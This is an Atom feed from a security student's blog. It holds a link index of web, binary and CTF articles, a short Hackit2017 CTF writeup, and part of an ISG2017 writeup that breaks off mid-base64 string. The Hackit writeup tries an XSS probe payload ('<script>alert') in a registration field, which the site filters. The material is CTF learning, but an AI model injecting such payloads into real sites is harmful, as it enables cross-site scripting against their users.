<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-08-28T10:56:49.656Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://yoursite.com/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://yoursite.com/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-08-28T10:56:49.656Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="external">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/" target="_blank" rel="external">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="external">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more" target="_blank" rel="external">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/" target="_blank" rel="external">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/" target="_blank" rel="external">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/" target="_blank" rel="external">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/" target="_blank" rel="external">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/" target="_blank" rel="external">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/" target="_blank" rel="external">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/" target="_blank" rel="external">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/" target="_blank" rel="external">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/" target="_blank" rel="external">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="external">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/" target="_blank" rel="external">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/" target="_blank" rel="external">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/" target="_blank" rel="external">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/" target="_blank" rel="external">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/" target="_blank" rel="external">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/" target="_blank" rel="external"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/" target="_blank" rel="external">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/" target="_blank" rel="external">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/" target="_blank" rel="external">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/" target="_blank" rel="external">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/" target="_blank" rel="external">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="external">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/" target="_blank" rel="external">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/" target="_blank" rel="external">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/" target="_blank" rel="external">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" target="_blank" rel="external">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/" target="_blank" rel="external">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="external">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/" target="_blank" rel="external">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/" target="_blank" rel="external">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/" target="_blank" rel="external">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/" target="_blank" rel="external">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/" target="_blank" rel="external">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/" target="_blank" rel="external">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/" target="_blank" rel="external">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/" target="_blank" rel="external">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/" target="_blank" rel="external">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/" target="_blank" rel="external">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/" target="_blank" rel="external">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/" target="_blank" rel="external">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/" target="_blank" rel="external">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/" target="_blank" rel="external">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/" target="_blank" rel="external">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/" target="_blank" rel="external">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/" target="_blank" rel="external">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/" target="_blank" rel="external">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/" target="_blank" rel="external">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/" target="_blank" rel="external">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/" target="_blank" rel="external">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/" target="_blank" rel="external">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/" target="_blank" rel="external">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-H4ck3rM1nd-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/</id>
    <published>2017-08-28T11:54:28.000Z</published>
    <updated>2017-08-28T12:40:13.280Z</updated>
    
    <content type="html"><![CDATA[<p>跟着wp做的。<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Even hackers want to share their thoughts :)</div><div class="line">Attachment: (none)</div><div class="line">Webpage: http://tasks.ctf.com.ua:13373</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/18.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看基本功能。</p>
<p>注册，需要填写一个secret：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/19.png?raw=true" alt=""></p>
<p>登陆后：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/20.png?raw=true" alt=""></p>
<p>可以看一个profile:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/21.png?raw=true" alt=""></p>
<p>而edit点进去后可以修改about字段。</p>
<p>查看profile.php源代码，发现有一些提示：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/22.png?raw=true" alt=""></p>
<p>注意上图，我们在注册时填入的secret是放在input标签里的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Secret: &lt;input id=&quot;secret&quot; name=&quot;secret&quot; value=&quot;mygod&quot; type=&quot;text&quot;/&gt;</div></pre></td></tr></table></figure></p>
<p>如果我们在注册时填写secret为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;/&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot;</div></pre></td></tr></table></figure></p>
<p>也许能构造出xss？但很可惜被过滤掉了：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/23.png?raw=true" alt=""></p>
<p>可以看到<code>&gt;</code>和<code>&lt;</code>都被实体化了。</p>
<p>回到profile.php，查看edit功能，普通的xss攻击不成功，这里会直接把尖括号直接过滤掉。尝试CSS Injection。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://rioru.github.io/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html" target="_blank" rel="external">CTF Write-Up - HackIT CTF 2017 Web200</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跟着wp做的。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ISG2017-赛前练手题—writeup</title>
    <link href="http://yoursite.com/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/"/>
    <id>http://yoursite.com/2017/08/28/ISG2017-赛前练手题—writeup/</id>
    <published>2017-08-28T11:43:46.000Z</published>
    <updated>2017-08-28T11:53:20.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在某个员工的电脑上发现了一份奇怪的文件，你能找到什么东西吗？</div><div class="line">奇怪的文件(https://play.chinaisg.org/attachment/download/secret.backup)</div></pre></td></tr></table></figure>
<p>下载下来后打开，看起来是流量包。尾部发现一些base64串。解一下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">pngdata = <span class="string">"iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAG7ElEQVR4nO3dUY7bOgwF0OSh+9/ydAFPASTwknKm53wWqa2JcyGAkqn3z8/PC6j57/YA4DcQJAgQJAgQJAgQJAgQJAj4s/zX9/s9PI4d+5X6+viX99q/7KehFq9QH8DS8rLFAZyOoXivMZ/+KDMSBAgSBAgSBAgSBAgSBAgSBKzL30uT+8SLpc+j0u3+h/c/eXSvpaYB7I+qqSa+f9mlx/4IzUgQIEgQIEgQIEgQIEgQIEgQcFD+XmraZ90xgKMd2c+sCBdrx5+uMDmADtd/hC8zEkQIEgQIEgQIEgQIEgQIEgRUy9/PVC9JFy9bb35S/ORRPbep1n+9LD7JjAQBggQBggQBggQBggQBggQBX1/+bmpRPdak++gK9e7nxdE+sx/3E5iRIECQIECQIECQIECQIECQIECQIKC6jvRPbZXfV/9aiotLTS2T6jp+ME/4EZqRIECQIECQIECQIECQIECQIOCg/P3MLfST9dymLkIdTXyaKsLXz5B95o/wZUaCCEGCAEGCAEGCAEGCAEGCgPcTds7e1VFAb/pWmxrbN7VM+qd+WmYkCBAkCBAkCBAkCBAkCBAkCGhpon+9h/2RyR72YwOY/FqOTO5Vn/wVmZEgQJAgQJAgQJAgQJAgQJAgoFr+bqpmdhSajxqSNN2reNlJk11lJg/MPbrC/jXNSBAgSBAgSBAgSBAgSBAgSBCwLn9/UZeP4jWPLlsvlHd8X